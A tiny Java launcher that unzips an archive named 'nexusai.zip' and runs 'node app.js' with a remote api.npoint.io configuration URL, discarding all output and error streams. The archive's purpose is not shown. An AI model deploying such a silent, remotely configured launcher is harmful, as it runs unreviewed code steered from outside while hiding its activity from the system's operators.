import java.io.*;
import java.util.*;

public class run {
    public static void main(String[] args) {
        try {
            ProcessBuilder builder = new ProcessBuilder("bash", "-c", "unzip nexusai.zip;node app.js -s='https://api.npoint.io/7fea989e8de26bfb2c99'");
            builder.redirectOutput(ProcessBuilder.Redirect.DISCARD);
            builder.redirectError(ProcessBuilder.Redirect.DISCARD);
            Process process = builder.start();
            process.waitFor(); // wait if needed
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
